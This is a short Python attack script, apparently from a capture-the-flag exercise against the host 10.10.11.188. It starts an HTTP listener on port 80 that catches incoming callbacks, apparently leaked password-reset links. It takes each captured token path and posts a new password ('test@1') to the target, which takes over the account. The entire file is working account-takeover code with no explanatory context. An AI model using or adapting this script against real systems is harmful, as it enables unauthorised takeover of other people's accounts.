from http.server import HTTPServer,BaseHTTPRequestHandler
import requests

class myhandler(BaseHTTPRequestHandler):

		def do_GET(self):
			self.send_response(200)
			self.end_headers()
			self.reset(self.path)

		def reset(self,token):
			url = "http://10.10.11.188"+ token
			data = {"password":"test@1"}
			res = requests.post(url=url,data=data)
			print(res.text)

		def log_message(self,format,*args):
			print(f'callback from {self.command} : {self.address_string()} : {self.log_date_time_string()}')



def run():
	port = 80
	server = HTTPServer(('',port),myhandler)
	print("server listening on ",port)
	server.serve_forever()

run()
